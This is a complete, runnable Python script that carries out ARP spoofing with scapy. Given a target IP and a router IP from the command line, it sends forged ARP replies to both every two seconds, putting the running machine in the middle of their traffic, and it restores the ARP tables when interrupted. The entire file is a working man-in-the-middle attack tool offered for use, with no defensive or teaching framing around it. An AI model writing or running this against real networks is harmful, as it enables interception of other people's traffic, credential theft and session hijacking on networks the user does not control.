#!/bin/python3
import scapy.all as scapy
import time
import argparse


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast/arp_request
    answered_packets = scapy.srp(arp_broadcast, timeout=1, verbose=False)[0]
    mac = answered_packets[0][1].hwsrc
    return mac


def spoof(source_ip, dest_ip):
    # send() if python2 is used, custom ether frame not needed
    mac = get_mac(source_ip)
    ether = scapy.Ether(dst=mac)
    # by default op=1, which is arp request, op=2: arp reply
    arp = scapy.ARP(op=2, psrc=dest_ip, pdst=source_ip, hwdst=mac)
    packet = ether / arp
    scapy.sendp(packet, verbose=False)


def restore(source, dest):
    # only source mac is added here, otherwise it is the same as spoof function
    destination_mac = get_mac(dest)
    source_mac = get_mac(source)
    ether = scapy.Ether(dst=source_mac)
    arp_restore = scapy.ARP(op=2,pdst=dest,hwdst=destination_mac,psrc=source,hwsrc=source_mac)
    packet = ether / arp_restore
    scapy.sendp(packet, count=4, verbose=False) # increased count to 4 so that it gets delivered without fail


def get_ip_address():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="IP of target device")
    parser.add_argument("-r", "--router", dest="router", help="IP of router")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify the IP of target. Use --help for more info")
    elif not options.router:
        parser.error("[-] Please specify the IP of router. Use --help for more info")
    return [options.target, options.router]


def run():
    try:
        source_ip, router_ip = get_ip_address()
        packets_sent_count = 0
        while True:
            spoof(source_ip, router_ip) # once to spoof gateway
            spoof(router_ip, source_ip) # once more to spoof the router
            packets_sent_count += 2
            print(f"\r[+] Packets Sent: {packets_sent_count}", end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n\n[-] Detected Ctrl+C ..... Exiting!") 
        restore(source_ip, router_ip) # once to restore gateway
        restore(router_ip, source_ip) # once more to restore the router


run()